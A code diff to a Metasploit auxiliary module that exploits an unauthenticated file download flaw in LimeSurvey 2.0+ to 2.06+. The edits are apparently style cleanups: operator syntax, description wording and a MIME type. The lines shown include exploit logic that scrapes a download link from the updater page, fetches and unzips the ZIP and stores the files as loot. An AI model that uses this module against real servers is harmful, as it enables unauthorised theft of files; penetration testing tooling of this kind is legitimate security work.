@@ -19,7 +19,7 @@ class Metasploit3 < Msf::Auxiliary
       'Description'    => %q{
         This module exploits an unauthenticated file download vulnerability
         in limesurvey between 2.0+ and 2.06+ Build 151014. The file is downloaded
-        as a ZIP and unzipped automatically so also binary files can be downloaded.
+        as a ZIP and unzipped automatically, thus binary files can be downloaded.
       },
       'Author'         =>
         [
@@ -89,7 +89,7 @@ class Metasploit3 < Msf::Auxiliary
       'vars_post' => vars_post
     })
 
-    if res and res.code == 200 and res.body and res.body.include?('Download this file')
+    if res && res.code == 200 && res.body && res.body.include?('Download this file')
       match = res.body.match(%r{<div class="updater-background">\s+<p class="success " style="text-align: left;">\s+<strong>[^<]+</strong>\s+<br/>\s+([^<]+)<br/>\s+<a class="btn btn-success" href="([^"]+)" title="Download this file">Download this file</a>})
       if match
         local_path = match[1]
@@ -102,7 +102,7 @@ class Metasploit3 < Msf::Auxiliary
           'uri' => download_url
         })
 
-        if res and res.code == 200
+        if res && res.code == 200
           unzipped = unzip_file(res.body)
 
           unzipped.each do |filename, content|
@@ -111,7 +111,7 @@ class Metasploit3 < Msf::Auxiliary
 
             path = store_loot(
               'limesurvey.http',
-              '',
+              'application/octet-stream',
               rhost,
               content,
               filename
